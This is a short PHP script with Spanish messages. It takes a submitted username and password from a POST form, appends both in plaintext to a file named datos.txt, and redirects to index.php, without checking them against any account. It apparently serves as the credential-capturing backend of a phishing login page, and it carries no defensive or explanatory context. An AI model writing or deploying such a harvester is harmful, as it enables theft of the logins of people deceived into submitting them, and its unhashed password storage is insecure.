<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    if (isset($_POST["username"]) && isset($_POST["password"])) {
      
        $username = $_POST["username"];
        $password = $_POST["password"];

       
        $datos = "Nombre de usuario: $username\nContraseña: $password\n\n";

        
        $archivo = "datos.txt";

        
        $archivo_handle = fopen($archivo, "a");

        
        if ($archivo_handle === false) {
            die("No se pudo abrir el archivo para escritura.");
        }


        if (fwrite($archivo_handle, $datos) === false) {
            die("No se pudo escribir en el archivo.");
        }

      
        fclose($archivo_handle);

        
        header("Location: index.php");
        exit();
    } 
} 
?>
